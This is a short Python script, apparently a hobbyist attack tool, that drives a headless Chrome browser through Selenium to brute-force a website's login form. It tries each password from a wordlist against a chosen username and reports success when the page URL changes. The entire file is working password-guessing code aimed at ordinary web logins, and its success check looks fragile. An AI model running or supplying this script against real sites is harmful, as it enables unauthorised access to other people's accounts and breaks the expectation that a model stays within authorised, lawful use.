#Script Made By hax / haxer
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

def bruteForce(url, passList, username):
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    driver = webdriver.Chrome(options=options)

    driver.get(url)

    usernameInput = driver.find_element(By.NAME, "username")
    passInput = driver.find_element(By.NAME, "password")

    with open(passList, 'r') as list:
        for line in list:
            password = line.strip()

            usernameInput.send_keys(Keys.CONTROL + "a")
            usernameInput.send_keys(Keys.DELETE)

            passInput.send_keys(Keys.CONTROL + "a")
            passInput.send_keys(Keys.DELETE)

            usernameInput.send_keys(username)
            passInput.send_keys(password)

            passInput.send_keys(Keys.RETURN)

            current_url = driver.current_url
            
            time.sleep(2)

            if driver.current_url != current_url:
                print(f"[+] Password Found: {password}")
                driver.quit()
                return password


    driver.quit()
    print("\n[-] Password not found.")
    return None
